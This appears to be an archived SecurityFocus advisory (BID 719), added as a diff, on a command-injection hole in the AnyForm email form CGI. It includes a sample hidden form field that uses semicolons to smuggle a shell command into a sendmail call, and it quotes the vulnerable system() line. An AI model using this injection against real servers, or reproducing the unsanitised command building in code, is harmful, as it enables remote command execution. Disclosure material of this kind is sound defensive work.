@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/719/info
+
+AnyForm is a popular form CGI designed to support simple forms that deliver responses via email. Certain versions of AnyForm did not perform user supplied data sanity checking and could be exploited by remote intruders to execute arbitrary commands. These commands were issued as the UID which the web server runs as, typically 'nobody'. 
+
+Exploit as taken from the original post on this issue:
+
+To exploit, create a form with a hidden field something like this:
+
+<input type="hidden" name="AnyFormTo" value="foo@bar.com;command-to-execute
+with whatever arguments;/usr/lib/sendmail -t foo@bar.com ">
+
+Then submit the form to the "AnyForm" CGI on the server to be attacked.
+The value of this parameter is passed to this code:
+
+SystemCommand="/usr/lib/sendmail -t " + AnyFormTo + " <" + CombinedFileName;
+system(SystemCommand);
+
+Since system invokes a shell, the semicolons are treated as command
+delimeters and anything can be inserted
